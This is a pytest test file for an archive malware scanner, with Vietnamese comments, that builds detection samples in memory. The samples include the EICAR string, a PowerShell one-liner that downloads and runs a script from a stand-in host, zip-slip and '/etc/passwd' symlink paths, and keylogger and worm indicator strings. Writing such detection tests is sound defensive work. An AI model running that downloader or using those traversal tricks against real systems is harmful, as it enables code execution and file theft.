"""Mọi mẫu thử đều được tạo trong bộ nhớ lúc chạy test, không có mã độc thật nào trong repo."""
import gzip
import io
import json
import tarfile
import zipfile

import pytest

from archive_guard.cli import main
from archive_guard.scanner import Scanner

# Ghép chuỗi EICAR lúc chạy để antivirus trên máy bạn không xóa nhầm file test này
EICAR = ("X5O!P%@AP[4\\PZX54(P^)7CC)7}$" + "EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*").encode()
FAKE_EXE = b"MZ" + b"\0" * 126
PS_DOWNLOADER = b"IEX (New-Object Net.WebClient).DownloadString('http://example.invalid/a.ps1')"


def make_zip(files):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        for name, data in files.items():
            z.writestr(name, data)
    return buf.getvalue()


def scan(data, name="sample.zip", **kw):
    return Scanner(use_clamav=False, **kw).scan_bytes(data, name)


def rules_of(report):
    return {x.rule for f in report.files for x in f.findings}


def test_clean_zip():
    report = scan(make_zip({"readme.txt": b"xin chao", "src/app.py": b"print('hi')"}))
    assert report.verdict == "clean"
    assert not report.incomplete


def test_eicar_inside_nested_zip():
    inner = make_zip({"eicar.com": EICAR})
    report = scan(make_zip({"tools/inner.zip": inner}))
    assert report.verdict == "malicious"
    hit = [f for f in report.files if any(x.rule == "HASH.KNOWN_BAD" for x in f.findings)]
    assert hit[0].path == "sample.zip > tools/inner.zip > eicar.com"


def test_disguised_file_names():
    report = scan(make_zip({"invoice.pdf.exe": FAKE_EXE, "photo‮gpj.exe": FAKE_EXE,
                            "report.pdf": FAKE_EXE, "scan.jpg            .scr": FAKE_EXE}))
    assert {"NAME.DOUBLE_EXT", "NAME.BIDI", "NAME.CONTENT_MISMATCH", "NAME.PADDING"} <= rules_of(report)
    assert report.verdict != "clean"


def test_zip_slip():
    assert "NAME.PATH_TRAVERSAL" in rules_of(scan(make_zip({"../../evil.bat": b"echo hi"})))


def test_keylogger_indicators():
    sample = (FAKE_EXE + b"SetWindowsHookExA\0GetForegroundWindow\0[BACKSPACE][ENTER][CAPSLOCK]\0"
              + b"https://api.telegram.org/bot123:abc/sendMessage")
    report = scan(make_zip({"svchost.exe": sample}))
    assert report.verdict == "malicious"
    assert {"keylogger", "stealer"} <= set(report.categories)


def test_usb_worm_utf16_strings():
    sample = FAKE_EXE + "autorun.inf".encode("utf-16-le") + b"\0" + "GetDriveTypeW".encode("utf-16-le")
    report = scan(make_zip({"usb.exe": sample, "autorun.inf": b"[autorun]\nopen=usb.exe"}))
    assert {"WORM.USB", "NAME.AUTORUN_INF"} <= rules_of(report)
    assert "worm" in report.categories


def test_powershell_downloader():
    report = scan(make_zip({"setup.ps1": PS_DOWNLOADER}))
    assert "DOWNLOAD.EXEC_PS" in rules_of(report)
    assert report.verdict == "suspicious"


def test_zip_bomb_ratio():
    report = scan(make_zip({"big.bin": bytes(60 << 20)}))
    assert "ARCHIVE.BOMB_RATIO" in rules_of(report)


def test_total_size_limit():
    report = scan(make_zip({"a.bin": bytes(700_000), "b.bin": bytes(700_000)}), max_total_mb=1)
    assert "ARCHIVE.BOMB_TOTAL" in rules_of(report)
    assert report.incomplete


def test_nesting_depth_limit():
    data = make_zip({"x.txt": b"x"})
    for i in range(4):
        data = make_zip({f"level{i}.zip": data})
    report = scan(data, max_depth=2)
    assert "ARCHIVE.TOO_DEEP" in rules_of(report)


def _set_encrypted_flag(data):
    """zipfile chuẩn không tạo được ZIP có mật khẩu, nên bật cờ 'đã mã hóa' trực tiếp trong header."""
    b = bytearray(data)
    for sig, offset in ((b"PK\x03\x04", 6), (b"PK\x01\x02", 8)):
        b[b.find(sig) + offset] |= 1
    return bytes(b)


def test_password_protected_executable():
    report = scan(_set_encrypted_flag(make_zip({"invoice.exe": FAKE_EXE})))
    assert "ARCHIVE.ENCRYPTED_EXEC" in rules_of(report)
    assert report.incomplete


def test_tar_gz_symlink_and_single_gz():
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as t:
        info = tarfile.TarInfo("x/run.ps1")
        info.size = len(PS_DOWNLOADER)
        t.addfile(info, io.BytesIO(PS_DOWNLOADER))
        link = tarfile.TarInfo("x/passwd")
        link.type, link.linkname = tarfile.SYMTYPE, "../../../etc/passwd"
        t.addfile(link)
    assert {"DOWNLOAD.EXEC_PS", "NAME.PATH_TRAVERSAL"} <= rules_of(scan(buf.getvalue(), "a.tar.gz"))
    assert "DOWNLOAD.EXEC_PS" in rules_of(scan(gzip.compress(PS_DOWNLOADER), "run.ps1.gz"))


def make_7z(files, password=None, header_encryption=False):
    py7zr = pytest.importorskip("py7zr")
    buf = io.BytesIO()
    with py7zr.SevenZipFile(buf, "w", password=password, header_encryption=header_encryption) as z:
        for name, data in files.items():
            z.writestr(data, name)
    return buf.getvalue()


def test_7z_with_and_without_password():
    assert scan(make_7z({"eicar.com": EICAR}), "a.7z").verdict == "malicious"
    locked = make_7z({"eicar.com": EICAR}, password="infected")
    assert scan(locked, "a.7z").incomplete
    assert scan(locked, "a.7z", passwords=["sai", "infected"]).verdict == "malicious"
    hidden = make_7z({"eicar.com": EICAR}, password="infected", header_encryption=True)
    assert "ARCHIVE.ENCRYPTED" in rules_of(scan(hidden, "a.7z"))


def test_custom_yara_rule(tmp_path):
    pytest.importorskip("yara")
    rule = tmp_path / "demo.yar"
    rule.write_text('rule Demo { meta: severity = "critical" category = "trojan" description = "demo" '
                    'strings: $a = "hello-malware" condition: $a }')
    report = scan(make_zip({"x.bin": b"..hello-malware.."}), yara_paths=[rule])
    assert "YARA.Demo" in rules_of(report)
    assert report.verdict == "malicious"


def test_update_hashes_by_family(tmp_path):
    from archive_guard import malwarebazaar

    sample = b"MZ fake agent tesla sample"
    sha = __import__("hashlib").sha256(sample).hexdigest()

    def fake_query(key, form):
        assert key == "k"
        if form.get("signature") == "AgentTesla":
            return [{"sha256_hash": sha, "signature": "AgentTesla"}]
        if form.get("signature") == "Mirai":
            raise RuntimeError("illegal_signature")  # một họ lỗi không làm hỏng cả lượt
        return []

    cache = tmp_path / "mb.txt"
    assert malwarebazaar.update("k", cache, log=lambda *_: None, query=fake_query) == (1, 1)
    assert malwarebazaar.update("k", cache, log=lambda *_: None, query=fake_query) == (0, 1)
    report = scan(make_zip({"invoice.bin": sample}), hash_files=[cache])
    hit = [x for f in report.files for x in f.findings if x.rule == "HASH.KNOWN_BAD"][0]
    assert hit.category == "keylogger" and "AgentTesla" in hit.title
    assert report.verdict == "malicious"


def test_update_hashes_needs_working_key(tmp_path, monkeypatch):
    from archive_guard import malwarebazaar

    with pytest.raises(malwarebazaar.AuthError):
        malwarebazaar.update("", tmp_path / "mb.txt")

    def broken(key, form):
        raise RuntimeError("unknown_auth_key")

    with pytest.raises(RuntimeError, match="unknown_auth_key"):
        malwarebazaar.update("bad", tmp_path / "mb.txt", log=lambda *_: None, query=broken)
    assert not (tmp_path / "mb.txt").exists()
    monkeypatch.delenv("ABUSECH_AUTH_KEY", raising=False)
    assert main(["--update-hashes"]) == 3


def test_api_request_format(monkeypatch):
    from archive_guard import malwarebazaar

    seen = {}

    def fake_urlopen(req, timeout):
        seen["key"], seen["body"] = req.get_header("Auth-key"), req.data.decode()
        return io.BytesIO(json.dumps({"query_status": "ok", "data": [{"sha256_hash": "a" * 64}]}).encode())

    monkeypatch.setattr(malwarebazaar.urllib.request, "urlopen", fake_urlopen)
    rows = malwarebazaar._query("k", {"query": "get_siginfo", "signature": "AgentTesla", "limit": 1000})
    assert rows == [{"sha256_hash": "a" * 64}]
    assert seen == {"key": "k", "body": "query=get_siginfo&signature=AgentTesla&limit=1000"}


def make_pe(sections):
    """PE tối giản: header DOS + PE + bảng section [(tên, dữ liệu, characteristics)]."""
    import struct
    table = 0x40 + 24
    offset = table + 40 * len(sections)
    head = bytearray(b"MZ" + bytes(0x3A) + struct.pack("<I", 0x40) + b"PE\0\0"
                     + struct.pack("<HH", 0x14C, len(sections)) + bytes(12) + struct.pack("<HH", 0, 0))
    body = b""
    for name, data, chars in sections:
        head += name.encode().ljust(8, b"\0") + struct.pack("<IIIIIIHHI", len(data), 0, len(data),
                                                           offset + len(body), 0, 0, 0, 0, chars)
        body += data
    return bytes(head) + body


def test_packer_detection():
    import os
    code = (b"\x55\x8b\xec\x83\xec\x10" * 2000)[:8192]  # mã máy lặp lại → entropy thấp
    packed = os.urandom(8192)  # dữ liệu nén/mã hóa → entropy ~8
    exec_flag = 0x60000020
    rules = rules_of(scan(make_pe([(".text", code, exec_flag)]), "app.exe"))
    assert not {r for r in rules if r.startswith("PACKER")}
    upx = rules_of(scan(make_pe([("UPX0", b"", exec_flag), ("UPX1", packed, exec_flag)]), "app.exe"))
    assert {"PACKER.NAME", "PACKER.ENTROPY"} <= upx
    themida = scan(make_pe([(".themida", code, exec_flag)]), "app.exe")
    assert any("Themida" in x.title for f in themida.files for x in f.findings)
    assert "PACKER.ENTROPY" in rules_of(scan(make_pe([(".text", packed, exec_flag)]), "app.exe"))
    assert scan(b"MZ" + bytes(10), "broken.exe").verdict == "clean"  # header hỏng không gây lỗi


def test_cli_exit_codes_and_json(tmp_path):
    (tmp_path / "clean.zip").write_bytes(make_zip({"a.txt": b"hi"}))
    (tmp_path / "bad.zip").write_bytes(make_zip({"invoice.pdf.exe": FAKE_EXE}))
    out = tmp_path / "report.json"
    assert main([str(tmp_path / "clean.zip"), "--no-clamav"]) == 0
    assert main([str(tmp_path), "--no-clamav", "--json", str(out)]) == 1
    data = json.loads(out.read_text(encoding="utf-8"))
    assert sorted(r["verdict"] for r in data["reports"]) == ["clean", "suspicious"]
    assert main([str(tmp_path / "khong-ton-tai.zip"), "--no-clamav"]) == 3
